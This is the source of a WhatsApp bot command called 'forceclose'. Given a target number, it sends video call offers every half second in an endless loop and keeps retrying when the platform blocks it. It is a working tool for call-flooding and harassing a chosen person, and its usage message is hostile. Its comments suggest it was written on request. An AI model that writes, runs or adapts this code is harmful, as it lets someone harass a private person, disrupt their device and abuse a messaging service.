import isAdmin from '../../lib/isAdmin.js';

let activeForceClose = new Map();

export default {
    name: 'forceclose',
    description: 'Send unlimited video call notifications to a target number (Self Mode Only)',
    category: 'Self',
    async execute(msg, { sock, args }) {
        const from = msg.key.remoteJid;
        
        // This is a self-mode command, only the owner should run it
        if (!msg.key.fromMe) return;

        let target = args[0];
        if (!target && msg.message?.extendedTextMessage?.contextInfo?.participant) {
            target = msg.message.extendedTextMessage.contextInfo.participant;
        }

        if (!target) {
            return sock.sendMessage(from, { text: ' 😈😈 provide the fucking target number or reply to the fucking user.\nUsage: .forceclose 234******' });
        }

        // Standardize JID
        let targetJid = target.includes('@') ? target : target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        if (activeForceClose.has(targetJid)) {
            activeForceClose.delete(targetJid);
            return sock.sendMessage(from, { text: `✅ Stopped forceclose for @${targetJid.split('@')[0]}`, mentions: [targetJid] });
        }

        activeForceClose.set(targetJid, true);
        await sock.sendMessage(from, { text: `🚀 Starting forceclose for @${targetJid.split('@')[0]}\nSend the command again to stop.`, mentions: [targetJid] });

        // Loop for unlimited calling
        while (activeForceClose.has(targetJid)) {
            try {
                // offerCall is the internal method for sending call notifications
                // We use video: true as requested
                await sock.offerCall(targetJid, { video: true });
                
                // Small delay to prevent local rate limit but keep it "unlimited"
                await new Promise(resolve => setTimeout(resolve, 500)); 
            } catch (err) {
                console.log(`[FORCECLOSE] Error calling ${targetJid}:`, err.message);
                // If it fails repeatedly, it might be due to WhatsApp blocking, but we keep trying as requested
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    }
};
